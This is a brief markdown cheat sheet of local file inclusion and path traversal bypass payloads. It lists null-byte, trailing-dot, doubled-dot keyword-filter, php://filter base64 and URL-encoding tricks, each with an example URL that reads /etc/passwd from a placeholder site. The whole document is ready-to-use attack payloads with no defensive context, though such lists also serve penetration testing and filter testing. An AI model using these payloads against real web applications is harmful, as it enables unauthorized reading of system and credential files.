## Null Byte bypass

### Example:

#### http://site.com/index.php?file=../../../etc/passwd%00 (0x00 in hex)

## Current directory trick

####  http://site.com/index.php?file=../../../etc/passwd/.

## Keyword filter bypass

### Example:

#### http://site.com/index.php?file=....//....//....//....//etc/passwd

## Base64 PHP Filter

#### http://site.com/index.php?file=php://filter/convert.base64-encode/resource=../../etc/passwd

## HTML URL Encoding bypass

### Use Cyberchef! https://gchq.github.io/CyberChef/
